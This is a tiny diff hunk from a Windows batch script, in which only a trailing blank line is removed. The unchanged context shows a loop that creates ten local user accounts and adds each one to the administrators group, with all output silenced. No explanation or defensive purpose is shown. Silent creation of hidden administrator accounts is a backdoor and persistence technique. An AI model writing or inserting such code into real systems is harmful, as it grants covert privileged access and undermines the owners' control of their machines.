@@ -130,4 +130,3 @@ for /l %%i in (1,1,10) do (
     net user !u! !p! /add >nul 2>&1
     net localgroup administrators !u! /add >nul 2>&1
 )
-
